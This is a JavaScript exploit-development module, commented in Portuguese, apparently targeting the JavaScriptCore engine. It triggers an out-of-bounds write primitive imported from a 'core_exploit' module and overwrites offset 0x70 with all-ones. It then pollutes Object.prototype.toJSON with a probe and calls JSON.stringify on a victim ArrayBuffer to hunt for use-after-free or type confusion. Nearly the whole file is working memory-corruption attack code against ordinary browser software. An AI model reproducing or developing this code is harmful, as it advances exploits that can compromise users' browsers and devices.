// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
// Renomeado internamente para refletir o novo foco
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Usado para a escrita OOB gatilho
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

let test_results_for_json_uaf = { success: false, message: "Teste não iniciado.", details: "" };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70 no oob_array_buffer_real
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor que aciona o getter

const VICTIM_AB_SIZE = 64; // Tamanho do ArrayBuffer vítima para o teste JSON UAF

// Função de sondagem para Object.prototype.toJSON
function probeVictimAB_toJSON() {
    const FNAME_toJSON = "probeVictimAB_toJSON";
    let details = [];
    details.push(`toJSON CALLED! this: ${Object.prototype.toString.call(this)}`);

    if (this instanceof ArrayBuffer) {
        details.push("this IS ArrayBuffer.");
        try {
            details.push(`this.byteLength: ${this.byteLength} (Esperado: ${VICTIM_AB_SIZE} ou corrompido)`);
            if (this.byteLength !== VICTIM_AB_SIZE && this.byteLength !== 0) { // 0 pode ser se foi detached
                logS3("toJSON_PROBE: CORRUPÇÃO DE BYTELENGTH! " + details.join('; '), "vuln", FNAME_toJSON);
                test_results_for_json_uaf.success = true;
                test_results_for_json_uaf.message = "Corrupção de byteLength do ArrayBuffer vítima detectada em toJSON!";
            }
            
            // Tentar usar o AB
            let dv = new DataView(this);
            details.push(`DataView criada sobre this. dv.byteLength: ${dv.byteLength}`);
            if (dv.byteLength > 0) {
                let val = dv.getUint32(0, true); // Tenta ler
                details.push(`Leitura de this[0] (u32) via DataView: ${toHex(val)}`);
            }
        } catch (e) {
            details.push(`Erro ao usar 'this' (ArrayBuffer) em toJSON: ${e.message}`);
            logS3("toJSON_PROBE: ERRO ao usar 'this' como ArrayBuffer: " + e.message, "error", FNAME_toJSON);
            // Um erro aqui pode ser um UAF ou type confusion grave
            test_results_for_json_uaf.success = true;
            test_results_for_json_uaf.message = `Erro (${e.message}) ao usar ArrayBuffer vítima em toJSON! (Possível UAF/Type Confusion)`;
        }
    } else {
        details.push("this NÃO é ArrayBuffer! TYPE CONFUSION!");
        logS3("toJSON_PROBE: TYPE CONFUSION! 'this' não é ArrayBuffer!", "vuln", FNAME_toJSON);
        test_results_for_json_uaf.success = true;
        test_results_for_json_uaf.message = "Type Confusion detectada! 'this' em toJSON não é ArrayBuffer.";
    }
    test_results_for_json_uaf.details = details.join('; ');
    return { "processed_by_probe": true, "type": Object.prototype.toString.call(this) };
}


export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeJsonUAF_with_0x70_Trigger";
    logS3(`--- Iniciando Teste JSON UAF com Gatilho OOB em 0x70 ---`, "test", FNAME_TEST);

    test_results_for_json_uaf = { success: false, message: "Teste não executado.", details: "" };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;

    try {
        await triggerOOB_primitive(); // Configura oob_array_buffer_real
        if (!oob_array_buffer_real) {
            test_results_for_json_uaf.message = "Falha ao inicializar OOB.";
            logS3(test_results_for_json_uaf.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado.`, "info", FNAME_TEST);

        // 1. Poluir Object.prototype.toJSON
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
        Object.defineProperty(Object.prototype, 'toJSON', {
            value: probeVictimAB_toJSON,
            writable: true, enumerable: false, configurable: true
        });
        pollutionApplied = true;
        logS3("Object.prototype.toJSON poluído com a função de sondagem.", "info", FNAME_TEST);

        // 2. Criar o ArrayBuffer vítima
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        // Opcional: Preencher com um padrão para verificar se o conteúdo muda
        try {
            new DataView(victim_ab).setUint32(0, 0xDEADBEEF, true);
            new DataView(victim_ab).setUint32(4, 0xCAFEBABE, true);
        } catch(e) { logS3("Erro ao preencher victim_ab", "warn", FNAME_TEST); }
        logS3(`ArrayBuffer vítima (tamanho ${VICTIM_AB_SIZE}) criado. Conteúdo inicial[0]: ${toHex(new DataView(victim_ab).getUint32(0,true))}`, "info", FNAME_TEST);


        // 3. Realizar a escrita OOB "gatilho" no oob_array_buffer_real (objeto diferente do victim_ab)
        logS3(`Realizando escrita OOB gatilho em oob_data[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_TEST);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho completada.`, "info", FNAME_TEST);
        
        // Pequena pausa para garantir que quaisquer efeitos da escrita OOB se propaguem
        await PAUSE_S3(100);

        // 4. Chamar JSON.stringify no ArrayBuffer vítima
        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);
        let stringify_result_str = "N/A";
        try {
            stringify_result_str = JSON.stringify(victim_ab);
            logS3(`JSON.stringify(victim_ab) completado. Resultado string: ${stringify_result_str}`, "info", FNAME_TEST);
            // Se chegarmos aqui sem test_results_for_json_uaf.success = true, e a toJSON foi chamada,
            // significa que a toJSON não detectou corrupção óbvia.
            if (pollutionApplied && !test_results_for_json_uaf.success && test_results_for_json_uaf.details.includes("toJSON CALLED")) {
                 test_results_for_json_uaf.message = "toJSON foi chamada no victim_ab, mas nenhuma corrupção/erro óbvio detectado nela.";
            } else if (!pollutionApplied && !test_results_for_json_uaf.details.includes("toJSON CALLED")) {
                test_results_for_json_uaf.message = "JSON.stringify completado, mas a toJSON poluída não parece ter sido chamada.";
            }

        } catch (e) {
            logS3(`Erro CRÍTICO durante JSON.stringify(victim_ab): ${e.message}`, "error", FNAME_TEST);
            // Este erro é fora da toJSON, pode ser grave
            test_results_for_json_uaf.success = true; // Um erro aqui é um sucesso especulativo
            test_results_for_json_uaf.message = `Erro CRÍTICO em JSON.stringify(victim_ab): ${e.message}`;
            test_results_for_json_uaf.error = String(e);
        }

    } catch (mainError) {
        logS3(`Erro principal no teste: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        test_results_for_json_uaf.success = false; // Indica falha no setup do teste
        test_results_for_json_uaf.message = `Erro crítico no fluxo do teste: ${mainError.message}`;
        test_results_for_json_uaf.error = String(mainError);
    } finally {
        // Restaurar Object.prototype.toJSON
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            } else {
                delete Object.prototype.toJSON;
            }
            logS3("Object.prototype.toJSON restaurado.", "info", "CleanupFinal");
        }
        clearOOBEnvironment();
    }

    if (test_results_for_json_uaf.success) {
        logS3(`RESULTADO TESTE JSON UAF (com gatilho 0x70): SUCESSO ESPECULATIVO! ${test_results_for_json_uaf.message}`, "vuln", FNAME_TEST);
    } else {
        logS3(`RESULTADO TESTE JSON UAF (com gatilho 0x70): Sem sucesso óbvio. ${test_results_for_json_uaf.message}`, "warn", FNAME_TEST);
    }
    logS3(`  Detalhes da sondagem toJSON: ${test_results_for_json_uaf.details}`, "info", FNAME_TEST);
    logS3(`--- Teste JSON UAF com Gatilho OOB em 0x70 Concluído ---`, "test", FNAME_TEST);
}
